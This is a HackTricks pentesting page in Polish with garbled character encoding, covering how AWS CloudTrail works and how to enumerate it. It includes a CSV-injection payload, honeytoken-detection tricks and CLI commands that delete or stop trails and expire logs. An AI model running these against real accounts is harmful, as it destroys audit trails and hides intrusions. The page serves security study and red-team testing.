# AWS - CloudTrail Enum

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywnoÅ›Ä‡ w Twoim Å›rodowisku AWS**. Rejestruje szczegÃ³Å‚owe **dzienniki zdarzeÅ„**, w tym kto, co, kiedy i skÄ…d, dla wszystkich interakcji z zasobami AWS. Zapewnia to Å›lad audytowy zmian i dziaÅ‚aÅ„, pomagajÄ…c w analizie bezpieczeÅ„stwa, audytowaniu zgodnoÅ›ci i Å›ledzeniu zmian zasobÃ³w. CloudTrail jest niezbÄ™dny do zrozumienia zachowaÅ„ uÅ¼ytkownikÃ³w i zasobÃ³w, poprawy postaw bezpieczeÅ„stwa oraz zapewnienia zgodnoÅ›ci regulacyjnej.

KaÅ¼de zarejestrowane zdarzenie zawiera:

* NazwÄ™ wywoÅ‚anego interfejsu API: `eventName`
* WywoÅ‚anÄ… usÅ‚ugÄ™: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* MetodÄ™ agenta: `userAgent`. PrzykÅ‚ady:
* Signing.amazonaws.com - Z konsoli zarzÄ…dzania AWS
* console.amazonaws.com - UÅ¼ytkownik gÅ‚Ã³wny konta
* lambda.amazonaws.com - AWS Lambda
* Parametry Å¼Ä…dania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia sÄ… zapisywane w nowym pliku dziennika **okoÅ‚o co 5 minut w pliku JSON**, sÄ… przechowywane przez CloudTrail i ostatecznie pliki dziennika sÄ… **dostarczane do S3 okoÅ‚o 15 minut po**.\
Dzienniki CloudTrail mogÄ… byÄ‡ **agregowane miÄ™dzy kontami i miÄ™dzy regionami**.\
CloudTrail pozwala na uÅ¼ycie **integralnoÅ›ci pliku dziennika w celu weryfikacji, czy pliki dziennika pozostaÅ‚y niezmienione** od momentu dostarczenia ich przez CloudTrail. Tworzy on skrÃ³t SHA-256 dziennikÃ³w w pliku z sumÄ… kontrolnÄ…. SkrÃ³t sha-256 nowych dziennikÃ³w jest tworzony co godzinÄ™.\
Podczas tworzenia Å›cieÅ¼ki selektory zdarzeÅ„ pozwolÄ… okreÅ›liÄ‡, ktÃ³re zdarzenia majÄ… byÄ‡ rejestrowane: zarzÄ…dzanie, dane lub zdarzenia wnioskÃ³w.

Dzienniki sÄ… zapisywane w wiadrze S3. DomyÅ›lnie uÅ¼ywane jest szyfrowanie po stronie serwera (SSE-S3), wiÄ™c AWS odszyfruje zawartoÅ›Ä‡ dla osÃ³b, ktÃ³re majÄ… do niej dostÄ™p, ale dla dodatkowego zabezpieczenia moÅ¼na uÅ¼yÄ‡ SSE z KMS i wÅ‚asnych kluczy.

Dzienniki sÄ… przechowywane w **wiadrze S3 o nastÄ™pujÄ…cym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gdzie BucketName to: **`aws-cloudtrail-logs-<accountid>-<random>`**
* PrzykÅ‚ad: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

W kaÅ¼dym folderze kaÅ¼dy dziennik bÄ™dzie miaÅ‚ **nazwÄ™ zgodnÄ… z tym formatem**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja Nazewnictwa PlikÃ³w Dziennika

![](<../../../../.gitbook/assets/image (122).png>)

Ponadto **pliki skrÃ³tu (do sprawdzenia integralnoÅ›ci pliku)** bÄ™dÄ… w **tym samym wiadrze** pod:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregowanie DziennikÃ³w z Wielu Kont

* UtwÃ³rz Å›cieÅ¼kÄ™ w koncie AWS, do ktÃ³rego chcesz dostarczyÄ‡ pliki dziennika
* Zastosuj uprawnienia do docelowego wiadra S3, pozwalajÄ…c na dostÄ™p miÄ™dzykontowy dla CloudTrail i zezwalajÄ…c kaÅ¼demu kontu AWS, ktÃ³re potrzebuje dostÄ™pu
* UtwÃ³rz nowÄ… Å›cieÅ¼kÄ™ w innych kontach AWS i wybierz utworzone wiadro w kroku 1

Jednak nawet jeÅ›li moÅ¼esz zapisaÄ‡ wszystkie dzienniki w tym samym wiadrze S3, nie moÅ¼esz agregowaÄ‡ dziennikÃ³w CloudTrail z wielu kont do dziennikÃ³w CloudWatch naleÅ¼Ä…cych do jednego konta AWS.

{% hint style="danger" %}
PamiÄ™taj, Å¼e konto moÅ¼e mieÄ‡ **rÃ³Å¼ne Å›cieÅ¼ki** z CloudTrail **wÅ‚Ä…czone**, przechowujÄ…ce te same (lub rÃ³Å¼ne) dzienniki w rÃ³Å¼nych wiadrach.
{% endhint %}

### Cloudtrail ze wszystkich kont organizacji do 1

Podczas tworzenia CloudTrail moÅ¼na wskazaÄ‡ aktywowanie cloudtrail dla wszystkich kont w organizacji i uzyskanie dziennikÃ³w tylko do 1 wiadra:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

W ten sposÃ³b Å‚atwo moÅ¼na skonfigurowaÄ‡ CloudTrail we wszystkich regionach wszystkich kont i skoncentrowaÄ‡ dzienniki w 1 koncie (ktÃ³re naleÅ¼y chroniÄ‡).

### Sprawdzanie PlikÃ³w Dziennika

MoÅ¼esz sprawdziÄ‡, czy dzienniki nie zostaÅ‚y zmienione, uruchamiajÄ…c

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Dzienniki do CloudWatch

**CloudTrail moÅ¼e automatycznie wysyÅ‚aÄ‡ dzienniki do CloudWatch, dziÄ™ki czemu moÅ¼esz ustawiÄ‡ alerty, ktÃ³re ostrzegÄ… CiÄ™, gdy podejrzane dziaÅ‚ania zostanÄ… wykonane.**\
ZauwaÅ¼, Å¼e aby umoÅ¼liwiÄ‡ CloudTrailowi wysyÅ‚anie dziennikÃ³w do CloudWatch, musi zostaÄ‡ utworzona **rola**, ktÃ³ra pozwala na to dziaÅ‚anie. JeÅ›li to moÅ¼liwe, zaleca siÄ™ uÅ¼ywanie domyÅ›lnej roli AWS do wykonania tych dziaÅ‚aÅ„. Rola ta umoÅ¼liwi CloudTrailowi:

* CreateLogStream: Pozwala na tworzenie strumieni dziennikÃ³w CloudWatch Logs
* PutLogEvents: Dostarcza dzienniki CloudTrail do strumienia dziennikÃ³w CloudWatch Logs

### Historia zdarzeÅ„

Historia zdarzeÅ„ CloudTrail pozwala na sprawdzenie w tabeli dziennikÃ³w, ktÃ³re zostaÅ‚y zarejestrowane:

![](<../../../../.gitbook/assets/image (89).png>)

### Wnioski

**Wnioski CloudTrail** automatycznie **analizujÄ…** zdarzenia zarzÄ…dzania zapisami z szlakÃ³w CloudTrail i **ostrzegajÄ…** CiÄ™ o **nietypowej aktywnoÅ›ci**. Na przykÅ‚ad, jeÅ›li wystÄ…pi wzrost zdarzeÅ„ `TerminateInstance`, ktÃ³ry rÃ³Å¼ni siÄ™ od ustalonych bazelinÃ³w, zobaczysz to jako zdarzenie Wniosku. Te zdarzenia uÅ‚atwiajÄ… **znalezienie i reagowanie na nietypowÄ… aktywnoÅ›Ä‡ interfejsu API** bardziej niÅ¼ kiedykolwiek.

Wnioski sÄ… przechowywane w tym samym kubeÅ‚ku co dzienniki CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### BezpieczeÅ„stwo

| IntegralnoÅ›Ä‡ plikÃ³w dziennika CloudTrail | <ul><li>SprawdÅº, czy dzienniki nie zostaÅ‚y sfaÅ‚szowane (zmodyfikowane lub usuniÄ™te)</li><li><p>UÅ¼ywa plikÃ³w skrÃ³tu (tworzy skrÃ³t dla kaÅ¼dego pliku)</p><ul><li>Haszowanie SHA-256</li><li>SHA-256 z RSA do podpisywania cyfrowego</li><li>klucz prywatny naleÅ¼Ä…cy do Amazon</li></ul></li><li>Tworzenie pliku skrÃ³tu trwa 1 godzinÄ™ (wykonywane o peÅ‚nej godzinie co godzinÄ™)</li></ul> |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Zatrzymaj nieautoryzowany dostÄ™p         | <ul><li><p>UÅ¼yj polityk IAM i polityk kubeÅ‚ka S3</p><ul><li>ZespÃ³Å‚ ds. bezpieczeÅ„stwa â€”> dostÄ™p admina</li><li>Audytorzy â€”> dostÄ™p tylko do odczytu</li></ul></li><li>UÅ¼yj SSE-S3/SSE-KMS do szyfrowania dziennikÃ³w</li></ul>                                                                                                                                        |
| Zapobiegaj usuwaniu plikÃ³w dziennika      | <ul><li>Ogranicz dostÄ™p do usuwania za pomocÄ… polityk IAM i kubeÅ‚ka</li><li>Skonfiguruj usuwanie S3 MFA</li><li>SprawdÅº za pomocÄ… Walidacji pliku dziennika</li></ul>                                                                                                                                                                                            |

## Doradca dostÄ™pu

Doradca dostÄ™pu AWS polega na ostatnich 400 dniach dziennikÃ³w AWS **CloudTrail, aby zgromadziÄ‡ swoje wnioski**. CloudTrail rejestruje historiÄ™ wywoÅ‚aÅ„ interfejsu API AWS i zwiÄ…zanych z nimi zdarzeÅ„ wykonanych w koncie AWS. Doradca dostÄ™pu wykorzystuje te dane do **pokazania, kiedy usÅ‚ugi byÅ‚y ostatnio uÅ¼ywane**. AnalizujÄ…c dzienniki CloudTrail, Doradca dostÄ™pu moÅ¼e okreÅ›liÄ‡, ktÃ³re usÅ‚ugi AWS zostaÅ‚y uÅ¼yte przez uÅ¼ytkownika IAM lub rolÄ™ i kiedy to nastÄ…piÅ‚o. Pomaga to administratorom AWS podejmowaÄ‡ Å›wiadome decyzje dotyczÄ…ce **dostosowywania uprawnieÅ„**, poniewaÅ¼ mogÄ… zidentyfikowaÄ‡ usÅ‚ugi, ktÃ³re nie byÅ‚y uÅ¼ywane przez dÅ‚ugi czas i potencjalnie ograniczyÄ‡ zbyt szerokie uprawnienia na podstawie rzeczywistych wzorcÃ³w uÅ¼ycia.

{% hint style="success" %}
Dlatego Doradca dostÄ™pu informuje o **nadmierne przyznawane uprawnienia uÅ¼ytkownikom**, aby administrator mÃ³gÅ‚ je usunÄ…Ä‡
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## DziaÅ‚ania

### Wyliczanie
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **WstrzykniÄ™cie CSV**

Istnieje moÅ¼liwoÅ›Ä‡ wykonania wstrzykniÄ™cia CSV w CloudTrail, ktÃ³re wykona arbitralny kod, jeÅ›li dzienniki zostanÄ… wyeksportowane do formatu CSV i otwarte w programie Excel.\
NastÄ™pujÄ…cy kod wygeneruje wpis dziennika z nazwÄ… Å›cieÅ¼ki zawierajÄ…cÄ… Å‚adunek:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Dla wiÄ™cej informacji na temat WstrzykiwaÅ„ CSV sprawdÅº stronÄ™:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Dla bardziej szczegÃ³Å‚owych informacji na temat tej konkretnej techniki sprawdÅº [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **OminiÄ™cie Wykrywania**

### OminiÄ™cie **HoneyTokens**

Honeytokens sÄ… tworzone w celu **wykrywania wycieku wraÅ¼liwych informacji**. W przypadku AWS sÄ… to **klucze AWS, ktÃ³rych uÅ¼ycie jest monitorowane**, jeÅ›li coÅ› wyzwala akcjÄ™ z tym kluczem, to ktoÅ› musiaÅ‚ ukraÅ›Ä‡ ten klucz.

JednakÅ¼e, Honeytokens takie jak te stworzone przez [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) uÅ¼ywajÄ… rozpoznawalnej nazwy konta lub tego samego identyfikatora konta AWS dla wszystkich swoich klientÃ³w. Dlatego, jeÅ›li moÅ¼esz uzyskaÄ‡ nazwÄ™ konta i/lub identyfikator konta bez spowodowania utworzenia jakiegokolwiek logu przez Cloudtrail, **moÅ¼esz dowiedzieÄ‡ siÄ™, czy klucz jest honeytokenem czy nie**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) ma pewne reguÅ‚y, aby wykryÄ‡, czy klucz naleÅ¼y do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* JeÅ›li **`canarytokens.org`** pojawia siÄ™ w nazwie roli lub identyfikatorze konta **`534261010715`** pojawia siÄ™ w komunikacie bÅ‚Ä™du.
* TestujÄ…c je bardziej niedawno, uÅ¼ywajÄ… konta **`717712589309`** i wciÄ…Å¼ majÄ… ciÄ…g **`canarytokens.com`** w nazwie.
* JeÅ›li **`SpaceCrab`** pojawia siÄ™ w nazwie roli w komunikacie bÅ‚Ä™du
* **SpaceSiren** uÅ¼ywa **uuids** do generowania nazw uÅ¼ytkownikÃ³w: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* JeÅ›li **nazwa wyglÄ…da jak losowo wygenerowana**, istnieje duÅ¼e prawdopodobieÅ„stwo, Å¼e jest to HoneyToken.

#### Pobierz identyfikator konta z identyfikatora klucza

MoÅ¼esz uzyskaÄ‡ **Identyfikator Konta** z **zakodowanego** wewnÄ…trz **klucza dostÄ™pu** jak [**wyjaÅ›niono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdziÄ‡ identyfikator konta na liÅ›cie kont AWS Honeytokens:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
SprawdÅº wiÄ™cej informacji w [**oryginalnym badaniu**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Nie generuj logu

Najbardziej skutecznÄ… technikÄ… jest tak naprawdÄ™ prosta. Po prostu uÅ¼yj klucza, ktÃ³ry wÅ‚aÅ›nie znalazÅ‚eÅ›, aby uzyskaÄ‡ dostÄ™p do jakiejÅ› usÅ‚ugi wewnÄ…trz swojego wÅ‚asnego konta atakujÄ…cego. Spowoduje to, Å¼e **CloudTrail wygeneruje log w TWOIM WÅASNYM koncie AWS, a nie w koncie ofiary**.

Rzecz w tym, Å¼e wynik pokaÅ¼e bÅ‚Ä…d wskazujÄ…cy identyfikator konta i nazwÄ™ konta, wiÄ™c **bÄ™dziesz w stanie sprawdziÄ‡, czy to jest Honeytoken**.

#### UsÅ‚ugi AWS bez logÃ³w

W przeszÅ‚oÅ›ci byÅ‚y pewne **usÅ‚ugi AWS, ktÃ³re nie wysyÅ‚aÅ‚y logÃ³w do CloudTrail** (znajdÅº [listÄ™ tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). NiektÃ³re z tych usÅ‚ug bÄ™dÄ… **odpowiadaÄ‡** bÅ‚Ä™dem zawierajÄ…cym **ARN roli klucza**, jeÅ›li ktoÅ› nieautoryzowany (klucz honeytoken) sprÃ³buje uzyskaÄ‡ do niej dostÄ™p.

W ten sposÃ³b **atakujÄ…cy moÅ¼e uzyskaÄ‡ ARN klucza bez wywoÅ‚ywania Å¼adnego logu**. W ARN atakujÄ…cy moÅ¼e zobaczyÄ‡ **identyfikator konta AWS i nazwÄ™**, Å‚atwo jest poznaÄ‡ identyfikatory i nazwy kont firm HoneyToken, w ten sposÃ³b atakujÄ…cy moÅ¼e zidentyfikowaÄ‡, czy token jest HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
ZauwaÅ¼, Å¼e wszystkie publiczne interfejsy API, ktÃ³re okazaÅ‚y siÄ™ nie tworzyÄ‡ logÃ³w CloudTrail, zostaÅ‚y teraz naprawione, wiÄ™c byÄ‡ moÅ¼e bÄ™dziesz musiaÅ‚ znaleÅºÄ‡ swoje...

Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [**oryginalne badanie**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### DostÄ™p do trzeciej infrastruktury

Pewne usÅ‚ugi AWS bÄ™dÄ… **tworzyÄ‡ pewnÄ… infrastrukturÄ™**, takÄ… jak **Bazy danych** lub **klastry Kubernetes** (EKS). UÅ¼ytkownik **bezpoÅ›rednio komunikujÄ…cy siÄ™ z tymi usÅ‚ugami** (takimi jak interfejs API Kubernetes) **nie bÄ™dzie korzystaÅ‚ z interfejsu API AWS**, wiÄ™c CloudTrail nie bÄ™dzie w stanie zobaczyÄ‡ tej komunikacji.

Dlatego uÅ¼ytkownik majÄ…cy dostÄ™p do EKS, ktÃ³ry odkryÅ‚ adres URL interfejsu API EKS, mÃ³gÅ‚by lokalnie wygenerowaÄ‡ token i **komunikowaÄ‡ siÄ™ bezpoÅ›rednio z usÅ‚ugÄ… API, nie zostajÄ…c wykrytym przez CloudTrail**.

WiÄ™cej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### Usuwanie Å›cieÅ¼ek
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj Å›cieÅ¼ki
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### WyÅ‚Ä…cz logowanie wieloregionowe

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### WyÅ‚Ä…czanie logowania za pomocÄ… selektorÃ³w zdarzeÅ„

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykÅ‚adzie pojedynczy selektor zdarzeÅ„ jest podany jako tablica JSON z pojedynczym obiektem. `"ReadWriteType": "ReadOnly"` oznacza, Å¼e **selektor zdarzeÅ„ powinien rejestrowaÄ‡ tylko zdarzenia tylko do odczytu** (wiÄ™c CloudTrail insights **nie bÄ™dÄ… sprawdzaÄ‡ zdarzeÅ„ zapisu** na przykÅ‚ad).

MoÅ¼esz dostosowaÄ‡ selektor zdarzeÅ„ w zaleÅ¼noÅ›ci od swoich konkretnych wymagaÅ„.

#### Usuwanie logÃ³w za pomocÄ… polityki cyklu Å¼ycia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikowanie konfiguracji kubeÅ‚ka

* UsuÅ„ kubeÅ‚ek S3
* ZmieÅ„ politykÄ™ kubeÅ‚ka, aby odrzuciÄ‡ wszelkie zapisy z usÅ‚ugi CloudTrail
* Dodaj politykÄ™ cyklu Å¼ycia do kubeÅ‚ka S3 w celu usuwania obiektÃ³w
* WyÅ‚Ä…cz klucz KMS uÅ¼ywany do szyfrowania logÃ³w CloudTrail

### Ransomware CloudTrail

#### Ransomware S3

MoÅ¼esz **wygenerowaÄ‡ klucz asymetryczny** i sprawiÄ‡, Å¼e **CloudTrail zaszyfruje dane** tym kluczem i **usunÄ…Ä‡ klucz prywatny**, aby zawartoÅ›Ä‡ CloudTrail nie mogÅ‚a zostaÄ‡ odzyskana.\
To jest w zasadzie **ransomware S3-KMS** wyjaÅ›niony w:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

To jest najprostszy sposÃ³b wykonania poprzedniego ataku z rÃ³Å¼nymi wymaganiami uprawnieÅ„:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencje**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
